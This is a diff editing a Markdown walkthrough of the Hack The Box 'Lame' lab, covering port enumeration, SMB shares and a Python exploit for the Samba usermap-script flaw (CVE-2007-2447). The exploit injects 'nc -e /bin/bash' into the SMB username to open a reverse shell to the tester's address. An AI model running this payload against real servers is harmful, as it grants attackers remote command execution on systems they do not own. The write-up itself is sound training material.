@@ -1,4 +1,5 @@
-# Beginner Track - Lame ![](pics/logo.png)
+![](pics/logo.png)
+# Beginner Track - Lame 
 
 ## Enumeration
 
@@ -30,7 +31,7 @@ PORT     STATE SERVICE     VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-So we have an open FTP port (21) with Anonymous login allowed, an SSH port (22), open samba ports (139,445) and a a distrubuted c/c++ compiler server on port 3632.
+So we have an open FTP port (21) with Anonymous login allowed, an SSH port (22), open samba ports (139,445) and a distrubuted c/c++ compiler server on port 3632.
 
 ## Examine Port 21 - Anonymous allowed
 
@@ -61,7 +62,7 @@ Let's start by enumerating the smb directories.
         WORKGROUP            LAME
 ```
 
-Obviously we have full read and write access to the `tmp` share. 
+Apparently we have full read and write access to the `tmp` share. 
 
 ```
 └──╼ $ smbclient //10.129.72.52/tmp
@@ -112,10 +113,9 @@ def exploit(rhost, rport, lhost, lport):
         payload = 'nc -e /bin/bash 10.10.14.50 4444'
         username = "/=`nohup " + payload + "`"
         conn = SMBConnection(username, "", "", "")
-        try:
-            conn.connect(rhost, int(rport), timeout=1)
-        except:
-            print("[+] Done")
+        err = conn.connect(rhost, rport)
+        if not err:
+            print("[+] Done !")
 
 if __name__ == '__main__':
     print("[*] CVE-2007-2447 - Samba usermap script")
@@ -123,11 +123,15 @@ if __name__ == '__main__':
         print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
     else:
         print("[+] Connecting !")
-        rhost = sys.argv[1]
-        rport = sys.argv[2]
-        lhost = sys.argv[3]
-        lport = sys.argv[4]
-        exploit(rhost, rport, lhost, lport)
+        try:
+            rhost = sys.argv[1]
+            rport = int(sys.argv[2])
+            lhost = sys.argv[3]
+            lport = int(sys.argv[4])
+            exploit(rhost, rport, lhost, lport)
+        except ValueError:
+            print("ERROR: Port must be an integer")
+            exit(0)
 ```
 
 Here we connect with the user set to our reverse shell payload. 
